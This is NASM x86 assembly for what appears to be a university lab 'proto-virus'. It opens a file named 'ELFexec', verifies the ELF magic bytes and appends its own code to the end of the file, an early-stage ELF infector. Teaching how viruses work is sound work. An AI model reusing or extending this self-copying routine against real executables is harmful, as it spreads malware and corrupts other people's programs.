%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define STDIN 0
%define STDOUT 1
%define STDERROR 2
%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define PERMISSION 0640
	global _start
	
section .text
get_my_loc:
	call anchor
anchor: pop eax
		ret

_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	
; You code for this lab goes here
	;print to stdout "The lab 9 proto-virus strikes!"
	call get_my_loc
	sub eax, anchor - OutStr ; if 'anchor' is the real runtime addr => exc = 'anchor' - (anchor-Outstr)
	write STDOUT, eax,lenOutStr ;ecx = Outstr
	;open ELFexec file
	call get_my_loc
	sub eax, anchor - FileName ; char* FIlname = "a"
	open eax, RDWR, PERMISSION ; ecx= FileName string
	;fd= eax 
	cmp eax, -1
	je exit_fail ;if fd == -1 then exit
	
	push eax ; save fd

	mov ebx,ebp
	sub ebx, STK_RES ; ebx = buf[0]

	; ;check that this is ELF file with 3 first bytes
	read eax,ebx, STK_RES ; read to stack [200 bytes max] ebx =buf[0]
	mov ebx,ebp
	sub ebx, STK_RES ; ebx = buf[0]
	;check ELF chars [7F 45 4C 46]

	cmp byte[ebx], 0x7F
	jne no_elf
	cmp byte[ebx+1], 0x45
	jne no_elf
	cmp byte[ebx+2], 0x4C
	jne no_elf
	cmp byte[ebx+3], 0x46
	jne no_elf
	; ;add code of virus to end of ELF file
	mov eax, [esp]; fd
	lseek eax, 0, SEEK_END ;seek to the end of the file from offset 0
	mov ebx, _start ;the start of virus label
	mov ecx, virus_end
	sub ecx, ebx ; virus_end - _start = size to write
	write [esp],ebx,ecx ;[esp] has the fd , ebx is the pointer to the label, ecx is the size of the virus
	;close file
	mov eax, [esp]; fd
	close eax
	jmp VirusExit
no_elf: 
	call get_my_loc
	sub eax, anchor - NotELF_Err
	write STDOUT,eax ,lenNotELF_Err
	exit -1
exit_fail:
       exit -1 	
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
lenOutStr equ $ - OutStr ;length of out string
Failstr:        db "perhaps not", 10 , 0
NotELF_Err:        db "Not ELF format.", 10 , 0
lenNotELF_Err equ $ - NotELF_Err ;length of out string
PreviousEntryPoint: dd VirusExit
virus_end:


